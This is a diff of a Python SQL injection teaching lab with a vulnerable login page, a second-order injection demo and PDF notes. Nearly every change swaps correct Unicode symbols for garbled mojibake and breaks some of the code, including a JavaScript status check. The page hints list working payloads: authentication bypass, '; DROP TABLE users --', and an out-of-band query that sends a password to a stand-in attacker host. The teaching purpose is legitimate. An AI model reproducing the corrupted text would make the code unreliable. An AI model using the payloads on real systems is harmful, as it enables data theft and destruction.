@@ -1,4 +1,4 @@
-"""
+﻿"""
 SQLMap Scanner & Learning Lab - DSTERMINAL Enterprise Edition v4.0
 Advanced SQL Injection Learning Lab with:
 - WAF Bypass Techniques
@@ -381,7 +381,7 @@ class EnhancedPDFNotesGenerator:
         """Generate enhanced PDF notes with advanced techniques and WAF bypass"""
         if not REPORTLAB_AVAILABLE:
             if self.console:
-                self.console.print("[red]❌ ReportLab not installed. PDF generation requires: pip install reportlab[/red]")
+                self.console.print("[red]âŒ ReportLab not installed. PDF generation requires: pip install reportlab[/red]")
             return None
         
         try:
@@ -541,23 +541,23 @@ class EnhancedPDFNotesGenerator:
                 body_style
             ))
             story.append(Paragraph(
-                "• <b>Automated exploitation</b> using tools like SQLMap, sqlmap.py, and custom scripts",
+                "â€¢ <b>Automated exploitation</b> using tools like SQLMap, sqlmap.py, and custom scripts",
                 body_style
             ))
             story.append(Paragraph(
-                "• <b>WAF bypass</b> using obfuscation, encoding, and fragmentation techniques",
+                "â€¢ <b>WAF bypass</b> using obfuscation, encoding, and fragmentation techniques",
                 body_style
             ))
             story.append(Paragraph(
-                "• <b>Second-order injection</b> where payloads are stored then executed",
+                "â€¢ <b>Second-order injection</b> where payloads are stored then executed",
                 body_style
             ))
             story.append(Paragraph(
-                "• <b>Out-of-band exfiltration</b> using DNS, HTTP, or ICMP channels",
+                "â€¢ <b>Out-of-band exfiltration</b> using DNS, HTTP, or ICMP channels",
                 body_style
             ))
             story.append(Paragraph(
-                "• <b>Automated exploitation chains</b> combining multiple techniques",
+                "â€¢ <b>Automated exploitation chains</b> combining multiple techniques",
                 body_style
             ))
             story.append(Spacer(1, 10))
@@ -580,15 +580,15 @@ class EnhancedPDFNotesGenerator:
                 if 'waf_bypass_payloads' in tech:
                     story.append(Paragraph("<b>WAF Bypass Payloads:</b>", body_style))
                     for payload in tech['waf_bypass_payloads'][:3]:
-                        story.append(Paragraph(f"• <i>{payload}</i>", code_style))
+                        story.append(Paragraph(f"â€¢ <i>{payload}</i>", code_style))
                     if len(tech['waf_bypass_payloads']) > 3:
-                        story.append(Paragraph(f"• ... and {len(tech['waf_bypass_payloads']) - 3} more WAF bypass payloads", body_style))
+                        story.append(Paragraph(f"â€¢ ... and {len(tech['waf_bypass_payloads']) - 3} more WAF bypass payloads", body_style))
                 
                 # Show detection indicators
                 if 'detection_indicators' in tech:
                     story.append(Paragraph("<b>Detection Indicators:</b>", body_style))
                     for indicator in tech['detection_indicators']:
-                        story.append(Paragraph(f"• {indicator}", body_style))
+                        story.append(Paragraph(f"â€¢ {indicator}", body_style))
                 
                 story.append(Spacer(1, 10))
             
@@ -604,9 +604,9 @@ class EnhancedPDFNotesGenerator:
                 
                 story.append(Paragraph("<b>Examples:</b>", body_style))
                 for example in bypass['examples'][:3]:
-                    story.append(Paragraph(f"• <i>{example}</i>", code_style))
+                    story.append(Paragraph(f"â€¢ <i>{example}</i>", code_style))
                 if len(bypass['examples']) > 3:
-                    story.append(Paragraph(f"• ... and {len(bypass['examples']) - 3} more examples", body_style))
+                    story.append(Paragraph(f"â€¢ ... and {len(bypass['examples']) - 3} more examples", body_style))
                 
                 story.append(Paragraph(f"<b>Detection:</b> {bypass['detection']}", body_style))
                 story.append(Spacer(1, 6))
@@ -638,11 +638,11 @@ class EnhancedPDFNotesGenerator:
             
             story.append(Paragraph("5.1 Detection Strategies", subheading_style))
             detection_strategies = [
-                "• <b>WAF Log Analysis:</b> Monitor for encoded payloads, null bytes, and SQL keywords",
-                "• <b>Database Audit Logs:</b> Track unusual queries and error patterns",
-                "• <b>Network Monitoring:</b> Detect outbound DNS/HTTP requests from database servers",
-                "• <b>Application Performance:</b> Monitor for response time anomalies",
-                "• <b>User Behavior Analytics:</b> Detect unusual input patterns"
+                "â€¢ <b>WAF Log Analysis:</b> Monitor for encoded payloads, null bytes, and SQL keywords",
+                "â€¢ <b>Database Audit Logs:</b> Track unusual queries and error patterns",
+                "â€¢ <b>Network Monitoring:</b> Detect outbound DNS/HTTP requests from database servers",
+                "â€¢ <b>Application Performance:</b> Monitor for response time anomalies",
+                "â€¢ <b>User Behavior Analytics:</b> Detect unusual input patterns"
             ]
             for strategy in detection_strategies:
                 story.append(Paragraph(strategy, body_style))
@@ -650,12 +650,12 @@ class EnhancedPDFNotesGenerator:
             
             story.append(Paragraph("5.2 Prevention Best Practices", subheading_style))
             prevention_methods = [
-                "• <b>Parameterized Queries:</b> Always use prepared statements",
-                "• <b>Input Validation:</b> Implement strict allowlists",
-                "• <b>Least Privilege:</b> Database accounts with minimal permissions",
-                "• <b>WAF Configuration:</b> Regular updates and custom rules",
-                "• <b>Secure Code Review:</b> Automated and manual reviews",
-                "• <b>Regular Penetration Testing:</b> Professional security assessments"
+                "â€¢ <b>Parameterized Queries:</b> Always use prepared statements",
+                "â€¢ <b>Input Validation:</b> Implement strict allowlists",
+                "â€¢ <b>Least Privilege:</b> Database accounts with minimal permissions",
+                "â€¢ <b>WAF Configuration:</b> Regular updates and custom rules",
+                "â€¢ <b>Secure Code Review:</b> Automated and manual reviews",
+                "â€¢ <b>Regular Penetration Testing:</b> Professional security assessments"
             ]
             for method in prevention_methods:
                 story.append(Paragraph(method, body_style))
@@ -688,12 +688,12 @@ class EnhancedPDFNotesGenerator:
             story.append(Paragraph("7. Summary and Key Takeaways", heading_style))
             
             takeaways = [
-                "• <b>SQL injection remains critical</b> - OWASP Top 10 #1",
-                "• <b>Modern attackers use advanced techniques</b> - WAF bypass, out-of-band, second-order",
-                "• <b>Detection requires layered approach</b> - WAF, logs, network monitoring",
-                "• <b>Prevention is multi-faceted</b> - Parameterized queries, input validation, least privilege",
-                "• <b>Continuous learning is essential</b> - Regular testing and training",
-                "• <b>MITRE ATT&CK provides context</b> - Understand adversary TTPs"
+                "â€¢ <b>SQL injection remains critical</b> - OWASP Top 10 #1",
+                "â€¢ <b>Modern attackers use advanced techniques</b> - WAF bypass, out-of-band, second-order",
+                "â€¢ <b>Detection requires layered approach</b> - WAF, logs, network monitoring",
+                "â€¢ <b>Prevention is multi-faceted</b> - Parameterized queries, input validation, least privilege",
+                "â€¢ <b>Continuous learning is essential</b> - Regular testing and training",
+                "â€¢ <b>MITRE ATT&CK provides context</b> - Understand adversary TTPs"
             ]
             
             for takeaway in takeaways:
@@ -714,7 +714,7 @@ class EnhancedPDFNotesGenerator:
                 spaceAfter=4
             )
             
-            story.append(Paragraph("─" * 80, footer_style))
+            story.append(Paragraph("â”€" * 80, footer_style))
             story.append(Spacer(1, 10))
             story.append(Paragraph(
                 "<b>For more information, please contact:</b>",
@@ -725,22 +725,22 @@ class EnhancedPDFNotesGenerator:
                 contact_style
             ))
             story.append(Paragraph(
-                "📧 Email: <b>starkec.team@outlook.com</b>",
+                "ðŸ“§ Email: <b>starkec.team@outlook.com</b>",
                 contact_style
             ))
             story.append(Paragraph(
-                "📧 Email: <b>info@starkteamsupport.mw</b>",
+                "ðŸ“§ Email: <b>info@starkteamsupport.mw</b>",
                 contact_style
             ))
             story.append(Paragraph(
-                "🔗 Website: Stark Expo Tech Exchange",
+                "ðŸ”— Website: Stark Expo Tech Exchange",
                 contact_style
             ))
             story.append(Spacer(1, 10))
-            story.append(Paragraph("─" * 80, footer_style))
+            story.append(Paragraph("â”€" * 80, footer_style))
             story.append(Spacer(1, 6))
             story.append(Paragraph(
-                "© 2024 DSTERMINAL v4.0 | Advanced SQL Injection Learning Notes | All Rights Reserved",
+                "Â© 2024 DSTERMINAL v4.0 | Advanced SQL Injection Learning Notes | All Rights Reserved",
                 footer_style
             ))
             story.append(Paragraph(
@@ -754,13 +754,13 @@ class EnhancedPDFNotesGenerator:
             doc.build(story, onFirstPage=add_watermark, onLaterPages=add_watermark)
             
             if self.console:
-                self.console.print(f"[green]✅ Advanced PDF Notes generated: {filename}[/green]")
+                self.console.print(f"[green]âœ… Advanced PDF Notes generated: {filename}[/green]")
             
             return filename
             
         except Exception as e:
             if self.console:
-                self.console.print(f"[red]❌ PDF generation failed: {str(e)}[/red]")
+                self.console.print(f"[red]âŒ PDF generation failed: {str(e)}[/red]")
             return None
 
 
@@ -953,30 +953,30 @@ class EnhancedSQLInjectionLab:
             conn.close()
             
             if self.console:
-                self.console.print("[green]✅ Advanced SQL Injection Lab database initialized[/green]")
+                self.console.print("[green]âœ… Advanced SQL Injection Lab database initialized[/green]")
         except Exception as e:
             if self.console:
-                self.console.print(f"[red]❌ Database initialization error: {e}[/red]")
+                self.console.print(f"[red]âŒ Database initialization error: {e}[/red]")
     
     def _get_db_connection(self):
         try:
             return sqlite3.connect(self.db_path)
         except Exception as e:
             if self.console:
-                self.console.print(f"[red]❌ Database connection error: {e}[/red]")
+                self.console.print(f"[red]âŒ Database connection error: {e}[/red]")
             return None
     
     def set_secure_mode(self, enabled: bool):
         self.secure_mode = enabled
         if self.console:
             status = "[green]ENABLED[/green]" if enabled else "[red]DISABLED[/red]"
-            self.console.print(f"[yellow]🔒 Secure mode: {status}[/yellow]")
+            self.console.print(f"[yellow]ðŸ”’ Secure mode: {status}[/yellow]")
     
     def set_waf_mode(self, enabled: bool):
         self.waf_mode = enabled
         if self.console:
             status = "[green]ENABLED[/green]" if enabled else "[red]DISABLED[/red]"
-            self.console.print(f"[yellow]🛡️ WAF mode: {status}[/yellow]")
+            self.console.print(f"[yellow]ðŸ›¡ï¸ WAF mode: {status}[/yellow]")
     
     def toggle_learning(self):
         self.show_learning = not self.show_learning
@@ -1252,10 +1252,10 @@ class EnhancedSQLInjectionLab:
             self.injection_attempts = []
             self.second_order_payloads = []
             if self.console:
-                self.console.print("[green]✅ Advanced database reset to initial state[/green]")
+                self.console.print("[green]âœ… Advanced database reset to initial state[/green]")
         except Exception as e:
             if self.console:
-                self.console.print(f"[red]❌ Reset failed: {e}[/red]")
+                self.console.print(f"[red]âŒ Reset failed: {e}[/red]")
     
     def generate_pdf_notes(self) -> Optional[str]:
         """Generate enhanced PDF notes"""
@@ -1687,7 +1687,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
         <body>
             <div class="container">
                 <div class="header">
-                    <h1>🔄 Second-Order SQL Injection Lab</h1>
+                    <h1>ðŸ”„ Second-Order SQL Injection Lab</h1>
                     <p class="subtitle">Learn how stored payloads can be executed later</p>
                 </div>
                 
@@ -1705,7 +1705,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                 
                 <div class="second-order-container">
                     <div class="info-box">
-                        <h4>💡 What is Second-Order SQL Injection?</h4>
+                        <h4>ðŸ’¡ What is Second-Order SQL Injection?</h4>
                         <p>
                             Second-order SQL injection occurs when malicious input is <strong>stored</strong> in the database 
                             and then <strong>executed later</strong> when the stored data is used in a vulnerable query. 
@@ -1731,7 +1731,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                     </div>
                     
                     <div class="payload-form">
-                        <h3 style="color:#00ffff;margin-bottom:15px;">📝 Store a Payload</h3>
+                        <h3 style="color:#00ffff;margin-bottom:15px;">ðŸ“ Store a Payload</h3>
                         <p style="color:#888;margin-bottom:10px;">Enter a SQL injection payload to store in the database for later execution.</p>
                         
                         <form method="POST" action="/store_payload" id="payloadForm">
@@ -1739,7 +1739,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                             
                             <div style="margin-top:10px;display:flex;gap:10px;flex-wrap:wrap;align-items:center;">
                                 <button type="submit" style="width:auto;padding:10px 30px;background:linear-gradient(135deg,#00ff88,#00cc66);">
-                                    💾 Store Payload
+                                    ðŸ’¾ Store Payload
                                 </button>
                                 
                                 <span style="color:#888;font-size:13px;">or try one of these examples:</span>
@@ -1759,7 +1759,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                     
                     <div class="payload-list">
                         <h3 style="padding:15px 20px;color:#00ffff;margin:0;border-bottom:1px solid #30363d;">
-                            📋 Stored Payloads (Second-Order)
+                            ðŸ“‹ Stored Payloads (Second-Order)
                         </h3>
         """
         
@@ -1780,7 +1780,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
             """
             for idx, payload_data in enumerate(stored_payloads, 1):
                 status_class = "status-executed" if payload_data.get('executed', False) else "status-pending"
-                status_text = "✅ Executed" if payload_data.get('executed', False) else "⏳ Pending"
+                status_text = "âœ… Executed" if payload_data.get('executed', False) else "â³ Pending"
                 disabled = "disabled" if payload_data.get('executed', False) else ""
                 
                 html += f"""
@@ -1792,7 +1792,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                                     <td style="font-size:12px;color:#888;">{payload_data.get('created_at', datetime.now()).strftime('%H:%M:%S %Y-%m-%d') if hasattr(payload_data.get('created_at', None), 'strftime') else 'Just now'}</td>
                                     <td>
                                         <button onclick="executePayload({idx})" class="execute-btn" {disabled}>
-                                            ▶️ Execute
+                                            â–¶ï¸ Execute
                                         </button>
                                     </td>
                                 </tr>
@@ -1813,7 +1813,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                     </div>
                     
                     <div style="margin-top:30px;padding:20px;background:#161b22;border-radius:10px;border:1px solid #30363d;">
-                        <h3 style="color:#ffcc00;margin-bottom:10px;">🎯 Challenge</h3>
+                        <h3 style="color:#ffcc00;margin-bottom:10px;">ðŸŽ¯ Challenge</h3>
                         <p style="color:#c9d1d9;">Try these second-order injection challenges:</p>
                         <ol style="padding-left:20px;color:#c9d1d9;line-height:1.8;">
                             <li>Store a basic authentication bypass payload: <code style="background:#0d1117;padding:2px 8px;border-radius:3px;color:#ffcc00;">' OR '1'='1' --</code></li>
@@ -1823,7 +1823,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                         </ol>
                         <div style="margin-top:15px;padding:15px;background:#0d1117;border-radius:8px;border-left:3px solid #00ffff;">
                             <p style="color:#00ffff;font-size:13px;">
-                                💡 <strong>Tip:</strong> The payload is stored in the database and only executes when retrieved. 
+                                ðŸ’¡ <strong>Tip:</strong> The payload is stored in the database and only executes when retrieved. 
                                 This simulates real-world scenarios where malicious data is stored and later used in vulnerable queries.
                             </p>
                         </div>
@@ -1831,13 +1831,13 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                     
                     <div style="margin-top:20px;text-align:center;">
                         <button onclick="location.href='/download-pdf'" class="pdf-download-btn" style="padding:12px 40px;background:linear-gradient(135deg,#ff8800,#ff5500);color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:bold;cursor:pointer;">
-                            📄 Download PDF Notes
+                            ðŸ“„ Download PDF Notes
                         </button>
                     </div>
                 </div>
                 
                 <div class="footer">
-                    <p>⚠️ Educational Use Only | DSTERMINAL Enterprise Edition v4.0</p>
+                    <p>âš ï¸ Educational Use Only | DSTERMINAL Enterprise Edition v4.0</p>
                     <p style="font-size:0.7em;color:#444;margin-top:5px;">
                         For more info: <a href="mailto:starkec.team@outlook.com" style="color:#00ffff;">starkec.team@outlook.com</a> | 
                         <a href="mailto:info@starkteamsupport.mw" style="color:#00ffff;">info@starkteamsupport.mw</a>
@@ -1879,14 +1879,14 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                             }})
                             .then(response => response.text())
                             .then(html => {{
-                                if (html.includes('✅')) {{
+                                if (html.includes('âœ…')) {{
                                     resultBox.className = 'result-box success';
-                                    resultTitle.textContent = '✅ Execution Successful!';
+                                    resultTitle.textContent = 'âœ… Execution Successful!';
                                     resultMessage.innerHTML = 'The stored payload executed successfully! The injection worked because the application used the stored data in a vulnerable query.';
                                 }} else {{
                                     resultBox.className = 'result-box error';
-                                    resultTitle.textContent = '❌ Execution Failed';
-                                    resultMessage.innerHTML = 'The stored payload did not execute. This could be because:<br>• The application is using secure queries<br>• The payload syntax is incorrect<br>• The payload was already executed';
+                                    resultTitle.textContent = 'âŒ Execution Failed';
+                                    resultMessage.innerHTML = 'The stored payload did not execute. This could be because:<br>â€¢ The application is using secure queries<br>â€¢ The payload syntax is incorrect<br>â€¢ The payload was already executed';
                                 }}
                                 resultCode.textContent = 'Payload: ' + payload;
                                 
@@ -1894,12 +1894,12 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                                 const statusCell = row.querySelector('td:nth-child(4) span');
                                 if (statusCell) {{
                                     statusCell.className = 'payload-status status-executed';
-                                    statusCell.textContent = '✅ Executed';
+                                    statusCell.textContent = 'âœ… Executed';
                                 }}
                                 const actionBtn = row.querySelector('td:last-child button');
                                 if (actionBtn) {{
                                     actionBtn.disabled = true;
-                                    actionBtn.textContent = '✓ Done';
+                                    actionBtn.textContent = 'âœ“ Done';
                                 }}
                                 
                                 // Scroll to result
@@ -1907,7 +1907,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                             }})
                             .catch(error => {{
                                 resultBox.className = 'result-box error';
-                                resultTitle.textContent = '❌ Error';
+                                resultTitle.textContent = 'âŒ Error';
                                 resultMessage.textContent = 'Error executing payload: ' + error.message;
                                 resultCode.textContent = 'Payload: ' + payload;
                             }});
@@ -1928,11 +1928,11 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                         resultBox.style.display = 'block';
                         if (result === 'success') {{
                             resultBox.className = 'result-box success';
-                            resultTitle.textContent = '✅ Payload Stored Successfully!';
+                            resultTitle.textContent = 'âœ… Payload Stored Successfully!';
                             resultMessage.textContent = message;
                         }} else {{
                             resultBox.className = 'result-box error';
-                            resultTitle.textContent = '❌ Error Storing Payload';
+                            resultTitle.textContent = 'âŒ Error Storing Payload';
                             resultMessage.textContent = message;
                         }}
                         
@@ -1993,11 +1993,11 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                         <code>{tech_data['example']}</code>
                     </div>
                     <details class="tech-details">
-                        <summary>📖 How it works</summary>
+                        <summary>ðŸ“– How it works</summary>
                         <p>{tech_data['explanation']}</p>
                     </details>
                     <details class="tech-details">
-                        <summary>🛡️ WAF Bypass Payloads</summary>
+                        <summary>ðŸ›¡ï¸ WAF Bypass Payloads</summary>
                         <ul>
             """
             if 'waf_bypass_payloads' in tech_data:
@@ -2009,7 +2009,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                         </ul>
                     </details>
                     <details class="tech-details">
-                        <summary>🔍 Detection Indicators</summary>
+                        <summary>ðŸ” Detection Indicators</summary>
                         <ul>
             """
             if 'detection_indicators' in tech_data:
@@ -2019,7 +2019,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                         </ul>
                     </details>
                     <button onclick="testPayload('""" + tech_id + """', '""" + tech_data['example'].replace("'", "\\'") + """')" class="test-btn">
-                        🧪 Test This Payload
+                        ðŸ§ª Test This Payload
                     </button>
                 </div>
             </div>
@@ -2043,8 +2043,8 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                 modal.innerHTML = `
                     <div class="modal-content">
                         <div class="modal-header">
-                            <h2>🧪 Injection Test Result</h2>
-                            <button onclick="this.closest('.modal-overlay').remove()">✕</button>
+                            <h2>ðŸ§ª Injection Test Result</h2>
+                            <button onclick="this.closest('.modal-overlay').remove()">âœ•</button>
                         </div>
                         <div class="modal-body">
                             ${html}
@@ -2067,7 +2067,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
             html += f"""
             <div class="technique-card">
                 <div class="technique-header">
-                    <h4>🛡️ {bypass_data['name']}</h4>
+                    <h4>ðŸ›¡ï¸ {bypass_data['name']}</h4>
                 </div>
                 <div class="technique-body">
                     <p>{bypass_data['description']}</p>
@@ -2099,9 +2099,9 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
         html = """
         <div class="learning-panel" style="margin-bottom: 20px;">
             <div class="learning-header">
-                <h2>📚 SQL Injection Learning Center</h2>
+                <h2>ðŸ“š SQL Injection Learning Center</h2>
                 <button onclick="location.href='/toggle-learning'" class="close-learning" style="background: #ff555544; color: #ff5555; border: none; padding: 5px 15px; border-radius: 5px; cursor: pointer; font-size: 18px;">
-                    ✕ Hide
+                    âœ• Hide
                 </button>
             </div>
             <div style="padding: 20px;">
@@ -2110,13 +2110,13 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
         # Add all learning content sections
         learning_sections = [
             {
-                'title': '🔍 What is SQL Injection?',
+                'title': 'ðŸ” What is SQL Injection?',
                 'content': 'SQL Injection is a code injection technique that exploits vulnerabilities in web applications by inserting malicious SQL statements into input fields.',
                 'example': "Example: ' OR '1'='1' --",
                 'explanation': 'This payload bypasses authentication by making the WHERE clause always true.'
             },
             {
-                'title': '🎯 Common Techniques',
+                'title': 'ðŸŽ¯ Common Techniques',
                 'content': 'Here are some common SQL injection techniques you can practice:',
                 'items': [
                     ("Basic Authentication Bypass", "' OR '1'='1' --"),
@@ -2127,7 +2127,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                 ]
             },
             {
-                'title': '🛡️ WAF Bypass Techniques',
+                'title': 'ðŸ›¡ï¸ WAF Bypass Techniques',
                 'content': 'Learn how attackers bypass Web Application Firewalls:',
                 'items': [
                     ("Comment Obfuscation", "SELECT/**/1,2,3/**/FROM/**/users"),
@@ -2137,7 +2137,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                 ]
             },
             {
-                'title': '🔐 MITRE ATT&CK Framework',
+                'title': 'ðŸ” MITRE ATT&CK Framework',
                 'content': 'SQL injection techniques mapped to MITRE ATT&CK:',
                 'items': [
                     ("T1190", "Exploit Public-Facing Application"),
@@ -2147,7 +2147,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                 ]
             },
             {
-                'title': '📝 Detection Indicators',
+                'title': 'ðŸ“ Detection Indicators',
                 'content': 'Signs that SQL injection might be occurring:',
                 'items': [
                     ("Query errors containing database details"),
@@ -2169,10 +2169,10 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                 html += '<ul style="list-style: none; padding: 0;">'
                 for item in section['items']:
                     if isinstance(item, tuple) and len(item) == 2:
-                        if section['title'].startswith('📝') or section['title'].startswith('🔐'):
-                            html += f'<li style="padding: 5px 0; color: #c9d1d9;">• <strong>{item[0]}</strong> - {item[1]}</li>'
+                        if section['title'].startswith('ðŸ“') or section['title'].startswith('ðŸ”'):
+                            html += f'<li style="padding: 5px 0; color: #c9d1d9;">â€¢ <strong>{item[0]}</strong> - {item[1]}</li>'
                         else:
-                            html += f'<li style="padding: 5px 0; color: #c9d1d9;">• <code style="background: #0d1117; padding: 2px 8px; border-radius: 3px; color: #ffcc00;">{item[1]}</code> - {item[0]}</li>'
+                            html += f'<li style="padding: 5px 0; color: #c9d1d9;">â€¢ <code style="background: #0d1117; padding: 2px 8px; border-radius: 3px; color: #ffcc00;">{item[1]}</code> - {item[0]}</li>'
                 html += '</ul>'
             
             if 'example' in section:
@@ -2189,7 +2189,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
         html += """
             <div class="learning-section" style="border-top: 1px solid #30363d; padding-top: 20px; text-align: center;">
                 <button onclick="location.href='/download-pdf'" class="pdf-download-btn" style="padding: 12px 40px; background: linear-gradient(135deg, #ff8800, #ff5500); color: #fff; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer;">
-                    📄 Download Complete PDF Notes
+                    ðŸ“„ Download Complete PDF Notes
                 </button>
                 <p style="color: #888; margin-top: 10px; font-size: 13px;">Get all techniques, WAF bypass methods, and MITRE mapping in one PDF</p>
             </div>
@@ -2226,8 +2226,8 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
         """
         for attempt in attempts:
             success_class = "success-badge" if attempt['success'] else "fail-badge"
-            success_text = "✅ Yes" if attempt['success'] else "❌ No"
-            waf_text = "🛡️ Yes" if attempt['waf_blocked'] else "❌ No"
+            success_text = "âœ… Yes" if attempt['success'] else "âŒ No"
+            waf_text = "ðŸ›¡ï¸ Yes" if attempt['waf_blocked'] else "âŒ No"
             html += f"""
             <tr>
                 <td><span class="tech-badge">{attempt['technique']}</span></td>
@@ -2256,7 +2256,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
         if users:
             user_list_html = """
             <div class="user-list-hint">
-                <h4>👥 Available Users</h4>
+                <h4>ðŸ‘¥ Available Users</h4>
                 <table class="user-hint-table">
                     <tr><th>Username</th><th>Role</th><th>Department</th></tr>
             """
@@ -2272,18 +2272,18 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                 user_list_html += f"<tr><td colspan='3' style='text-align:center;color:#888;'>... and {len(users) - 10} more users</td></tr>"
             user_list_html += """
                 </table>
-                <p class="small">💡 Try SQL injection on any user account!</p>
+                <p class="small">ðŸ’¡ Try SQL injection on any user account!</p>
             </div>
             """
         
         error_html = f'<p style="color: #ff5555; text-align: center;">{error}</p>' if error else ''
         message_html = f'<p style="color: #00ff88; text-align: center;">{message}</p>' if message else ''
         
-        waf_status = "🛡️ WAF: ENABLED" if waf_mode else "🔓 WAF: DISABLED"
+        waf_status = "ðŸ›¡ï¸ WAF: ENABLED" if waf_mode else "ðŸ”“ WAF: DISABLED"
         waf_color = "#00ff88" if waf_mode else "#ff5555"
         
         learning_content = self._get_enhanced_learning_content(show_learning)
-        learning_toggle = "📖 Hide Learning Center" if show_learning else "📖 Show Learning Center"
+        learning_toggle = "ðŸ“– Hide Learning Center" if show_learning else "ðŸ“– Show Learning Center"
                 
         html = f"""
         <!DOCTYPE html>
@@ -2310,18 +2310,18 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
         <body>
             <div class="container">
                 <div class="header">
-                    <h1>🔐 Advanced SQL Injection Learning Lab</h1>
+                    <h1>ðŸ” Advanced SQL Injection Learning Lab</h1>
                     <p class="subtitle">DSTERMINAL Enterprise Edition v4.0 - Complete SQL Injection Lab</p>
                     <div class="header-controls">
                         <button onclick="location.href='/toggle-learning'" class="learning-toggle-btn">
                             {learning_toggle}
                         </button>
                         <button onclick="location.href='/download-pdf'" class="pdf-download-btn">
-                            📄 Download PDF Notes
+                            ðŸ“„ Download PDF Notes
                         </button>
                         <button onclick="location.href='/waf-toggle?mode={'disable' if waf_mode else 'enable'}'" 
                                 class="{'waf-toggle-btn' if waf_mode else 'waf-toggle-btn-off'}">
-                            {'🛡️ Disable WAF' if waf_mode else '🔓 Enable WAF'}
+                            {'ðŸ›¡ï¸ Disable WAF' if waf_mode else 'ðŸ”“ Enable WAF'}
                         </button>
                     </div>
                     <div class="waf-status">
@@ -2350,13 +2350,13 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                     </form>
                     
                     <div class="hint">
-                        <p>💡 Try these SQL injection techniques:</p>
+                        <p>ðŸ’¡ Try these SQL injection techniques:</p>
                         <ul style="list-style:none;padding:0;margin-top:5px;">
-                            <li>• <code>' OR '1'='1' --</code> (Basic bypass)</li>
-                            <li>• <code>' UNION SELECT 1,2,3,4,5,6,7,8 --</code> (Union-based)</li>
-                            <li>• <code>' AND SLEEP(5) --</code> (Time-based)</li>
-                            <li>• <code>'; DROP TABLE users --</code> (Stacked queries)</li>
-                            <li>• <code>' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\test')) --</code> (Out-of-band)</li>
+                            <li>â€¢ <code>' OR '1'='1' --</code> (Basic bypass)</li>
+                            <li>â€¢ <code>' UNION SELECT 1,2,3,4,5,6,7,8 --</code> (Union-based)</li>
+                            <li>â€¢ <code>' AND SLEEP(5) --</code> (Time-based)</li>
+                            <li>â€¢ <code>'; DROP TABLE users --</code> (Stacked queries)</li>
+                            <li>â€¢ <code>' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\test')) --</code> (Out-of-band)</li>
                         </ul>
                     </div>
                 </div>
@@ -2364,7 +2364,7 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
                 {user_list_html}
                 
                 <div class="footer">
-                    <p>⚠️ Educational Use Only | DSTERMINAL Enterprise Edition v4.0</p>
+                    <p>âš ï¸ Educational Use Only | DSTERMINAL Enterprise Edition v4.0</p>
                     <p style="font-size:0.7em;color:#444;margin-top:5px;">
                         For more info: <a href="mailto:starkec.team@outlook.com" style="color:#00ffff;">starkec.team@outlook.com</a> | 
                         <a href="mailto:info@starkteamsupport.mw" style="color:#00ffff;">info@starkteamsupport.mw</a>
@@ -2416,16 +2416,16 @@ class EnhancedLabHTTPHandler(BaseHTTPRequestHandler):
         
         # Determine status display
         status_color = "#00ff88" if secure_mode else "#ff5555"
-        status_text = "SECURE ✅" if secure_mode else "VULNERABLE ⚠️"
+        status_text = "SECURE âœ…" if secure_mode else "VULNERABLE âš ï¸"
         status_message = "SQL injection is PREVENTED (parameterized queries)" if secure_mode else "SQL injection is POSSIBLE (vulnerable)"
-        status_icon = "🔒" if secure_mode else "🔓"
-        toggle_text = "🔓 Disable Secure Mode" if secure_mode else "🔒 Enable Secure Mode"
+        status_icon = "ðŸ”’" if secure_mode else "ðŸ”“"
+        toggle_text = "ðŸ”“ Disable Secure Mode" if secure_mode else "ðŸ”’ Enable Secure Mode"
         toggle_mode = "disable" if secure_mode else "enable"
         toggle_class = "btn-vulnerable" if secure_mode else "btn-secure"
         
         waf_status_color = "#00ff88" if waf_mode else "#ff5555"
-        waf_status_text = "🛡️ ENABLED" if waf_mode else "❌ DISABLED"
-        waf_toggle_text = "🛡️ Disable WAF" if waf_mode else "🔓 Enable WAF"
+        waf_status_text = "ðŸ›¡ï¸ ENABLED" if waf_mode else "âŒ DISABLED"
+        waf_toggle_text = "ðŸ›¡ï¸ Disable WAF" if waf_mode else "ðŸ”“ Enable WAF"
         waf_toggle_mode = "disable" if waf_mode else "enable"
         waf_toggle_class = "btn-vulnerable" if waf_mode else "btn-secure"
         
